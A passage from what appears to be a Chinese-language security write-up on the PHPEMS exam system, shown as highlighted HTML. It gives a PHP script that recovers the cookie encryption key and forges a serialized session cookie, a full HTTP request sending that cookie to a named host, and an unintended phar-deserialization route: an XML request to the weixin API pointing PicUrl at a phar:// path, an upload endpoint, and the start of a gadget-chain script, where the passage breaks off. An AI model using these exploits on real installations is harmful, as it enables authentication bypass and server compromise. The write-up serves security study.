class="hljs-title class_">info</span> = &quot;%2595%259<span class="hljs-title class_">Cfs</span>%25<span class="hljs-title class_">AF</span>%25<span class="hljs-title class_">D9lon</span>%2586%25<span class="hljs-title class_">D9</span>%25<span class="hljs-title class_">C8</span>%25<span class="hljs-title class_">D7</span>%25<span class="hljs-title class_">D6</span>%25<span class="hljs-title class_">A0</span>%25<span class="hljs-title class_">A1</span>%25<span class="hljs-title class_">A2</span>%25<span class="hljs-title class_">CA</span>%2594<span class="hljs-title class_">X</span>%259<span class="hljs-title class_">D</span>%25<span class="hljs-title class_">AC</span>%259<span class="hljs-title class_">Ccg</span>%259<span class="hljs-title class_">DS</span>%2596<span class="hljs-title class_">i</span>%259<span class="hljs-title class_">B</span>%259<span class="hljs-title class_">B</span>%25<span class="hljs-title class_">C7</span>%2599%2598<span class="hljs-title class_">kp</span>%2595%259<span class="hljs-title class_">Eg</span>%2598%2598%25<span class="hljs-title class_">C7</span>%25<span class="hljs-title class_">CA</span>%259<span class="hljs-title class_">B</span>%259<span class="hljs-title class_">A</span>%2594<span class="hljs-title class_">lid</span>%2593%2592%259<span class="hljs-title class_">B</span>%2594<span class="hljs-title class_">i</span>%25<span class="hljs-title class_">C3fh</span>%2598<span class="hljs-title class_">c</span>%2587<span class="hljs-title class_">p</span>%25<span class="hljs-title class_">AC</span>%259<span class="hljs-title class_">F</span>%259<span class="hljs-title class_">Dn</span>%2584%25<span class="hljs-title class_">A6</span>%259<span class="hljs-title class_">E</span>%25<span class="hljs-title class_">A7</span>%25<span class="hljs-title class_">D9</span>%259<span class="hljs-title class_">B</span>%25<span class="hljs-title class_">A5</span>%25<span class="hljs-title class_">A2</span>%25<span class="hljs-title class_">CD</span>%25<span class="hljs-title class_">D6</span>%2585%259<span class="hljs-title class_">F</span>%25<span class="hljs-title class_">D6qkn</span>%2583<span class="hljs-title class_">ah</span>%2599<span class="hljs-title class_">g</span>%2592%255<span class="hljs-title class_">Ee</span>%2591<span class="hljs-title class_">b</span>%2587<span class="hljs-title class_">p</span>%25<span class="hljs-title class_">AC</span>%259<span class="hljs-title class_">F</span>%2595<span class="hljs-title class_">j</span>%259<span class="hljs-title class_">CU</span>%25<span class="hljs-title class_">AC</span>%2599%25<span class="hljs-title class_">D9</span>%25<span class="hljs-title class_">A5</span>%259<span class="hljs-title class_">F</span>%25<span class="hljs-title class_">A3</span>%25<span class="hljs-title class_">D2</span>%25<span class="hljs-title class_">DA</span>%25<span class="hljs-title class_">CC</span>%25<span class="hljs-title class_">D1</span>%25<span class="hljs-title class_">C8</span>%25<span class="hljs-title class_">A3</span>%259<span class="hljs-title class_">B</span>%25<span class="hljs-title class_">A1</span>%25<span class="hljs-title class_">CA</span>%25<span class="hljs-title class_">A4X</span>%259<span class="hljs-title class_">D</span>%25<span class="hljs-title class_">A2</span>%259<span class="hljs-title class_">Cal</span>%2593<span class="hljs-title class_">g</span>%259<span class="hljs-title class_">Bhk</span>%2595%259<span class="hljs-title class_">Bm</span>%259<span class="hljs-title class_">D</span>%25<span class="hljs-title class_">B0</span>&quot;; <span class="hljs-comment">// 远程环境</span><br>    <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;%2592%25A2%25A4%25A0%25F3%25A9%25AE%25A2%259D%2599%25C5%25DD%25E7%25D9%25DF%25D8%25C2%25D9%259DVk%25E9%25A8%259AS%25B3e%258F%258A%25AE%25BFii%2599%25D4%259C%25DAl%25A5%259A%2599%25A8%25B8%25AD%25DA%259E%25A7%2599%2584%25D6%259E%2595d%25DB%25A1%25CBU%25ABt%2580%258C%25BE%2598ok%258A%25E4%25CB%25EB%25A9%25DD%25D8%25D1%25E0%25C2%259A%25AF%25D9%25B0%25A2%258E%2592jfg%25A4%259E%2595Q%25A7t%2580%258C%25BE%2598gg%25A2%2593%25D9%25DD%25A9%25E7%25D2%25D2%25E5%25C6%25E1%25E1%25CB%25E2%25D2%25C1%25D9%25ADVk%25DF%25A8%2598X%25A9y%2594%2589%257D%2594ia%25A3%25EE&quot;</span>;   <span class="hljs-comment">//本地环境</span><br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$info</span>);  <br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$info</span>);  <br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$info</span>,<span class="hljs-number">64</span>,<span class="hljs-number">32</span>);  <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reverse</span>(<span class="hljs-params"><span class="hljs-variable">$payload1</span>,<span class="hljs-variable">$payload2</span></span>)  </span><br><span class="hljs-function">    </span>&#123;  <br>        <span class="hljs-variable">$il</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload1</span>);  <br>        <span class="hljs-variable">$key</span>= <span class="hljs-string">&quot;&quot;</span>;  <br>        <span class="hljs-variable">$kl</span> = <span class="hljs-number">32</span>;  <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$il</span>; <span class="hljs-variable">$i</span>++)  <br>        &#123;  <br>            <span class="hljs-variable">$p</span> = <span class="hljs-variable">$i</span>%<span class="hljs-variable">$kl</span>;  <br>            <span class="hljs-variable">$key</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload1</span>[<span class="hljs-variable">$i</span>])-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload2</span>[<span class="hljs-variable">$p</span>]));  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$key</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-title function_ invoke__">define</span>(CS1,<span class="hljs-title function_ invoke__">reverse</span>(<span class="hljs-variable">$info</span>, <span class="hljs-string">&#x27;:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:1&#x27;</span>));  <br>    <span class="hljs-keyword">echo</span> CS1;  <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)  </span><br><span class="hljs-function">    </span>&#123;  <br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>);  <br>        <span class="hljs-variable">$key</span> = CS1;  <br>        <span class="hljs-variable">$kl</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$key</span>);  <br>        <span class="hljs-variable">$il</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$info</span>);  <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$il</span>; <span class="hljs-variable">$i</span>++)  <br>        &#123;  <br>            <span class="hljs-variable">$p</span> = <span class="hljs-variable">$i</span>%<span class="hljs-variable">$kl</span>;  <br>            <span class="hljs-variable">$info</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$info</span>[<span class="hljs-variable">$i</span>])+<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$key</span>[<span class="hljs-variable">$p</span>]));  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$info</span>);  <br>    &#125;  <br>    <span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> \PHPEMS\<span class="hljs-title function_ invoke__">session</span>();  <br>    <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;sessionid&quot;</span>=&gt;<span class="hljs-string">&quot;123123123&quot;</span>, <span class="hljs-variable">$session</span>);  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$array</span>).<span class="hljs-string">&quot;\n&quot;</span>;  <br>    <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$array</span>))).<span class="hljs-string">&quot;\n&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>然后得到Cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">2595</span>%<span class="hljs-number">259</span>Ces%<span class="hljs-number">25</span>AF%<span class="hljs-number">25</span>D9lon%<span class="hljs-number">2586</span>%<span class="hljs-number">25</span>D9%<span class="hljs-number">25</span>C8%<span class="hljs-number">25</span>D7%<span class="hljs-number">25</span>D6%<span class="hljs-number">25</span>A0%<span class="hljs-number">25</span>A1%<span class="hljs-number">25</span>A2%<span class="hljs-number">25</span>CA%<span class="hljs-number">2594</span>X%<span class="hljs-number">259</span>D%<span class="hljs-number">25</span>AC%<span class="hljs-number">259</span>Cio%<span class="hljs-number">2585</span>b%<span class="hljs-number">2597</span>hj%<span class="hljs-number">2597</span>%<span class="hljs-number">2597</span>e%<span class="hljs-number">2594</span>f%<span class="hljs-number">255</span>Bo%<span class="hljs-number">25</span>CFlfo%<span class="hljs-number">25</span>B3%<span class="hljs-number">25</span>A0%<span class="hljs-number">2594</span>%<span class="hljs-number">2598</span>%<span class="hljs-number">259</span>DY%<span class="hljs-number">2582</span>%<span class="hljs-number">257</span>C%<span class="hljs-number">25</span>B1u%<span class="hljs-number">2583</span>%<span class="hljs-number">25</span>B5%<span class="hljs-number">2595</span>%<span class="hljs-number">25</span>D5%<span class="hljs-number">2595</span>%<span class="hljs-number">25</span>A8%<span class="hljs-number">25</span>D6%<span class="hljs-number">259</span>A%<span class="hljs-number">25</span>D4%<span class="hljs-number">25</span>A3%<span class="hljs-number">255</span>B%<span class="hljs-number">259</span>F%<span class="hljs-number">2597</span>n%<span class="hljs-number">25</span>DD%<span class="hljs-number">25</span>A6sm%<span class="hljs-number">25</span>A0T%<span class="hljs-number">25</span>A9%<span class="hljs-number">2599</span>%<span class="hljs-number">25</span>D7%<span class="hljs-number">25</span>D9%<span class="hljs-number">25</span>CC%<span class="hljs-number">25</span>D3%<span class="hljs-number">25</span>D1%<span class="hljs-number">25</span>A0%<span class="hljs-number">2596</span>V%<span class="hljs-number">259</span>C%<span class="hljs-number">25</span>A3p%<span class="hljs-number">2599</span>s%<span class="hljs-number">2584</span>af%<span class="hljs-number">2594</span>b%<span class="hljs-number">2596</span>fj%<span class="hljs-number">2587</span>%<span class="hljs-number">259</span>F%<span class="hljs-number">25</span>A7%<span class="hljs-number">259</span>CisV%<span class="hljs-number">25</span>D6%<span class="hljs-number">2596</span>%<span class="hljs-number">25</span>A5%<span class="hljs-number">25</span>A7%<span class="hljs-number">25</span>D5%<span class="hljs-number">25</span>D2%<span class="hljs-number">2585</span>%<span class="hljs-number">259</span>F%<span class="hljs-number">25</span>B2qcg%<span class="hljs-number">259</span>BR%<span class="hljs-number">2586</span>%<span class="hljs-number">25</span>AA%<span class="hljs-number">2589</span>%<span class="hljs-number">25</span>A7%<span class="hljs-number">257</span>D%<span class="hljs-number">2588</span>%<span class="hljs-number">25</span>BF%<span class="hljs-number">25</span>A1%<span class="hljs-number">25</span>C9%<span class="hljs-number">25</span>A4%<span class="hljs-number">25</span>AC%<span class="hljs-number">25</span>D6%<span class="hljs-number">25</span>D0V%<span class="hljs-number">259</span>Ces%<span class="hljs-number">25</span>AF%<span class="hljs-number">25</span>D9lgk%<span class="hljs-number">259</span>E%<span class="hljs-number">2588</span>c%<span class="hljs-number">25</span>B4%<span class="hljs-number">25</span>AB%<span class="hljs-number">2587</span>w%<span class="hljs-number">2581</span>%<span class="hljs-number">25</span>B4%<span class="hljs-number">258</span>C%<span class="hljs-number">25</span>A6%<span class="hljs-number">25</span>C6%<span class="hljs-number">25</span>A8%<span class="hljs-number">25</span>D5%<span class="hljs-number">25</span>A1%<span class="hljs-number">25</span>A1c%<span class="hljs-number">2595</span>%<span class="hljs-number">25</span>C7Wt%<span class="hljs-number">25</span>B4%<span class="hljs-number">259</span>Ee%<span class="hljs-number">2594</span>m%<span class="hljs-number">255</span>B%<span class="hljs-number">2584</span>%<span class="hljs-number">25</span>AE%<span class="hljs-number">2582</span>%<span class="hljs-number">257</span>B%<span class="hljs-number">2581</span>%<span class="hljs-number">25</span>B7%<span class="hljs-number">25</span>C2%<span class="hljs-number">25</span>D3%<span class="hljs-number">25</span>C9%<span class="hljs-number">25</span>D3%<span class="hljs-number">259</span>B%<span class="hljs-number">25</span>A1V%<span class="hljs-number">259</span>Bap%<span class="hljs-number">25</span>DD%<span class="hljs-number">25</span>AC%<span class="hljs-number">259</span>Cbe%<span class="hljs-number">259</span>DSe%<span class="hljs-number">2585</span>%<span class="hljs-number">2581</span>%<span class="hljs-number">25</span>B5%<span class="hljs-number">25</span>A9%<span class="hljs-number">2581</span>%<span class="hljs-number">25</span>B5%<span class="hljs-number">258</span>F%<span class="hljs-number">25</span>A9%<span class="hljs-number">2599</span>%<span class="hljs-number">25</span>D6%<span class="hljs-number">2596</span>%<span class="hljs-number">25</span>A54%<span class="hljs-number">25</span>D0%<span class="hljs-number">25</span>CF%<span class="hljs-number">25</span>D1%<span class="hljs-number">25</span>CF%<span class="hljs-number">25</span>CC%<span class="hljs-number">259</span>BTo%<span class="hljs-number">25</span>CAjf%<span class="hljs-number">259</span>D%<span class="hljs-number">25</span>B6%<span class="hljs-number">25</span>D5jm%<span class="hljs-number">259</span>DS%<span class="hljs-number">25</span>D9%<span class="hljs-number">2596</span>%<span class="hljs-number">259</span>B%<span class="hljs-number">25</span>D1%<span class="hljs-number">25</span>C9%<span class="hljs-number">25</span>A4%<span class="hljs-number">25</span>D4%<span class="hljs-number">2598</span>%<span class="hljs-number">255</span>Bo%<span class="hljs-number">25</span>D9lnl%<span class="hljs-number">259</span>E%<span class="hljs-number">2588</span>%<span class="hljs-number">25</span>DB%<span class="hljs-number">2596</span>%<span class="hljs-number">25</span>C2%<span class="hljs-number">25</span>AC%<span class="hljs-number">25</span>A5%<span class="hljs-number">2599</span>%<span class="hljs-number">25</span>D3P%<span class="hljs-number">25</span>A9%<span class="hljs-number">25</span>C7%<span class="hljs-number">25</span>AD%<span class="hljs-number">2582</span>%<span class="hljs-number">25</span>A5%<span class="hljs-number">25</span>A8%<span class="hljs-number">25</span>C8%<span class="hljs-number">25</span>A3%<span class="hljs-number">25</span>D5%<span class="hljs-number">2596</span>%<span class="hljs-number">25</span>AC%<span class="hljs-number">25</span>D8%<span class="hljs-number">25</span>DB%<span class="hljs-number">25</span>A3%<span class="hljs-number">25</span>D4%<span class="hljs-number">2597</span>vV%<span class="hljs-number">25</span>CBcf%<span class="hljs-number">2595</span>%<span class="hljs-number">25</span>C8%<span class="hljs-number">25</span>C9%<span class="hljs-number">2596</span>%<span class="hljs-number">259</span>D%<span class="hljs-number">2597</span>p%<span class="hljs-number">2594</span>%<span class="hljs-number">2595</span>%<span class="hljs-number">2596</span>i%<span class="hljs-number">2597</span>%<span class="hljs-number">25</span>C4%<span class="hljs-number">259</span>B%<span class="hljs-number">25</span>C7ek%<span class="hljs-number">25</span>C8a%<span class="hljs-number">259</span>Al%<span class="hljs-number">259</span>F%<span class="hljs-number">2597</span>%<span class="hljs-number">2594</span>%<span class="hljs-number">259</span>A%<span class="hljs-number">259</span>Akl%<span class="hljs-number">2599</span>%<span class="hljs-number">2588</span>R%<span class="hljs-number">25</span>AD%<span class="hljs-number">259</span>C%<span class="hljs-number">25</span>C9%<span class="hljs-number">25</span>D8%<span class="hljs-number">25</span>C8%<span class="hljs-number">2584</span>%<span class="hljs-number">25</span>D8%<span class="hljs-number">25</span>AA%<span class="hljs-number">2597</span>%<span class="hljs-number">25</span>A6%<span class="hljs-number">25</span>CF%<span class="hljs-number">2591</span>%<span class="hljs-number">25</span>A3%<span class="hljs-number">25</span>C7v%<span class="hljs-number">2584</span>%<span class="hljs-number">25</span>A0%<span class="hljs-number">259</span>A%<span class="hljs-number">25</span>C4%<span class="hljs-number">2595</span>%<span class="hljs-number">25</span>D2%<span class="hljs-number">259</span>E%<span class="hljs-number">25</span>A7%<span class="hljs-number">2587</span>%<span class="hljs-number">259</span>FW%<span class="hljs-number">258</span>F%<span class="hljs-number">2560</span>%<span class="hljs-number">255</span>Bo%<span class="hljs-number">25E3</span>%<span class="hljs-number">25</span>A5pf%<span class="hljs-number">259</span>E%<span class="hljs-number">2588</span>%<span class="hljs-number">25</span>C7%<span class="hljs-number">25</span>C6%<span class="hljs-number">2585</span>r%<span class="hljs-number">2581</span>n%<span class="hljs-number">2592</span>bp%<span class="hljs-number">2584</span>%<span class="hljs-number">2589</span>%<span class="hljs-number">25</span>AA%<span class="hljs-number">2580</span>z%<span class="hljs-number">25</span>B0%<span class="hljs-number">2584</span>%<span class="hljs-number">25</span>C1%<span class="hljs-number">25</span>A5%<span class="hljs-number">259</span>E%<span class="hljs-number">25</span>D5%<span class="hljs-number">25</span>C8%<span class="hljs-number">25</span>A3%<span class="hljs-number">2584</span>mjn%<span class="hljs-number">25E1</span>%<span class="hljs-number">25</span>A5pf%<span class="hljs-number">2594</span>%<span class="hljs-number">25</span>A0%<span class="hljs-number">2585</span>d%<span class="hljs-number">25</span>B3%<span class="hljs-number">257</span>F%<span class="hljs-number">2582</span>y%<span class="hljs-number">25</span>AE%<span class="hljs-number">2583</span>%<span class="hljs-number">2592</span>%<span class="hljs-number">25</span>D2%<span class="hljs-number">259</span>E%<span class="hljs-number">25</span>D2%<span class="hljs-number">2594</span>%<span class="hljs-number">25</span>A4c%<span class="hljs-number">259</span>D%<span class="hljs-number">25</span>CE%<span class="hljs-number">25</span>A3%<span class="hljs-number">25</span>A4%<span class="hljs-number">25</span>CE%<span class="hljs-number">25</span>C8V%<span class="hljs-number">259</span>D%<span class="hljs-number">259</span>Csd%<span class="hljs-number">25</span>A1%<span class="hljs-number">25</span>AF%<span class="hljs-number">25</span>B3%<span class="hljs-number">25</span>B1<br></code></pre></td></tr></table></figure><p>由于是以这种形式传的Cookie</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803728.png" alt="image">​</p><p>所以报文为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET /index.php HTTP/1.1<br>Host: exam.cyan.wetolink.com<br>Accept: */*<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>X-FORWARDED-FOR: 127.0.0.1<br>Cookie: exam_currentuser=%2595%259Ces%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Cio%2585b%2597hj%2597%2597e%2594f%255Bo%25CFlfo%25B3%25A0%2594%2598%259DY%2582%257C%25B1u%2583%25B5%2595%25D5%2595%25A8%25D6%259A%25D4%25A3%255B%259F%2597n%25DD%25A6sm%25A0T%25A9%2599%25D7%25D9%25CC%25D3%25D1%25A0%2596V%259C%25A3p%2599s%2584af%2594b%2596fj%2587%259F%25A7%259CisV%25D6%2596%25A5%25A7%25D5%25D2%2585%259F%25B2qcg%259BR%2586%25AA%2589%25A7%257D%2588%25BF%25A1%25C9%25A4%25AC%25D6%25D0V%259Ces%25AF%25D9lgk%259E%2588c%25B4%25AB%2587w%2581%25B4%258C%25A6%25C6%25A8%25D5%25A1%25A1c%2595%25C7Wt%25B4%259Ee%2594m%255B%2584%25AE%2582%257B%2581%25B7%25C2%25D3%25C9%25D3%259B%25A1V%259Bap%25DD%25AC%259Cbe%259DSe%2585%2581%25B5%25A9%2581%25B5%258F%25A9%2599%25D6%2596%25A54%25D0%25CF%25D1%25CF%25CC%259BTo%25CAjf%259D%25B6%25D5jm%259DS%25D9%2596%259B%25D1%25C9%25A4%25D4%2598%255Bo%25D9lnl%259E%2588%25DB%2596%25C2%25AC%25A5%2599%25D3P%25A9%25C7%25AD%2582%25A5%25A8%25C8%25A3%25D5%2596%25AC%25D8%25DB%25A3%25D4%2597vV%25CBcf%2595%25C8%25C9%2596%259D%2597p%2594%2595%2596i%2597%25C4%259B%25C7ek%25C8a%259Al%259F%2597%2594%259A%259Akl%2599%2588R%25AD%259C%25C9%25D8%25C8%2584%25D8%25AA%2597%25A6%25CF%2591%25A3%25C7v%2584%25A0%259A%25C4%2595%25D2%259E%25A7%2587%259FW%258F%2560%255Bo%25E3%25A5pf%259E%2588%25C7%25C6%2585r%2581n%2592bp%2584%2589%25AA%2580z%25B0%2584%25C1%25A5%259E%25D5%25C8%25A3%2584mjn%25E1%25A5pf%2594%25A0%2585d%25B3%257F%2582y%25AE%2583%2592%25D2%259E%25D2%2594%25A4c%259D%25CE%25A3%25A4%25CE%25C8V%259D%259Csd%25A1%25AF%25B3%25B1<br>Referer: http://phpems.xyz/index.php<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h3 id="Phar-非预期"><a href="#Phar-非预期" class="headerlink" title="Phar(非预期)"></a>Phar(非预期)</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">app/weixin/controller/index.api.php中的file_getcontents<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803917.png" alt="image">​</p><p>‍</p><p>直接去访问下这股路由发现返回了以下信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ToUserName</span>&gt;</span><br>&lt;![CDATA[]]&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">ToUserName</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FromUserName</span>&gt;</span><br>&lt;![CDATA[]]&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">FromUserName</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">MsgType</span>&gt;</span><br>&lt;![CDATA[text]]&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">MsgType</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Content</span>&gt;</span><br>&lt;![CDATA[信息已接收]]&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">Content</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">CreateTime</span>&gt;</span><br>&lt;![CDATA[1707039415]]&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">CreateTime</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FuncFlag</span>&gt;</span><br>&lt;![CDATA[0]]&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">FuncFlag</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803106.png" alt="image">​</p><p>‍</p><p>其实可以说明是接受XML数据的了，不过还是去看看代码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803246.png" alt="image">​</p><p>跟踪<code>getRev()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803387.png" alt="image">​</p><p>直接接收XML数据并且进行数组处理</p><p>获取<code>Type</code>​ 其实都是XML格式的子集，所以很轻松的拿到需要传参的数据，构造请求报文为如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803528.png" alt="image">​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ToUserName</span>&gt;</span><br>zjacky<br><span class="hljs-tag">&lt;/<span class="hljs-name">ToUserName</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FromUserName</span>&gt;</span><br>zjacky<br><span class="hljs-tag">&lt;/<span class="hljs-name">FromUserName</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">MsgType</span>&gt;</span><br>image<br><span class="hljs-tag">&lt;/<span class="hljs-name">MsgType</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Content</span>&gt;</span><br>zjacky<br><span class="hljs-tag">&lt;/<span class="hljs-name">Content</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">PicUrl</span>&gt;</span><br>phar:///etc/passwd<br><span class="hljs-tag">&lt;/<span class="hljs-name">PicUrl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">CreateTime</span>&gt;</span><br>&lt;![CDATA[1707039415]]&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">CreateTime</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FuncFlag</span>&gt;</span><br>xxx<br><span class="hljs-tag">&lt;/<span class="hljs-name">FuncFlag</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>‍</p><p>紧接着就是找上传点了，上传点位于</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">app<span class="hljs-regexp">/document/</span>controller/fineuploader.api.php<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803931.png" alt="image">​</p><p>直接进行上传，构造上传报文</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803077.png" alt="image">​</p><p>发现有返回地址，非常方便</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123;&quot;success&quot;:true,&quot;thumb&quot;:&quot;files\/attach\/images\/content\/20240204\/17070404291915.jpg&quot;,&quot;title&quot;:&quot;1.jpg&quot;&#125;<br></code></pre></td></tr></table></figure><p>然后生成下phar上传即可触发反序列化了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">PHPEMS</span>&#123;  <br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">session</span>&#123;  <br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>()  <br>        &#123;  <br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">sessionid</span>=&quot;1111111&quot;;  <br>            <span class="hljs-variable language_">$this</span>-&gt;pdosql= <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pdosql</span>();  <br>            <span class="hljs-variable language_">$this</span>-&gt;db= <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pepdo</span>();  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pdosql</span>  </span><br><span class="hljs-class"></span>&#123;  <br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span> ;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123; 